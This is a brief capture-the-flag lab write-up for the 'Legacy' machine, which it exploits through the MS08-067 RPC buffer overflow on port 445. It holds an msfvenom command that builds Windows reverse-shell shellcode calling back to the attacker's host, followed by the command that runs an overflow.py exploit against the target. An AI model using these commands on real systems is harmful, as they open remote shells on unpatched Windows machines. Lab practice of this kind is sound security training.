# Legacy - 10.10.10.4
## Windows machine with a buffer overflow on the RPC port
### As described within the link below
```
https://labs.f-secure.com/assets/BlogFiles/hello-ms08-067-my-old-friend.pdf
```

## Overflow.py is a POC to the metasploit module
### Need to create shellcode first with msfvenom =
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.28 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```
- This creates the shellcode needed for the machine to reach back out to me

### The exploit needs to run as follows
```
python overflow.py 10.10.10.4 7 445

```
- Becuase we are attacking SP3 with always on NX - Trial and error will help  
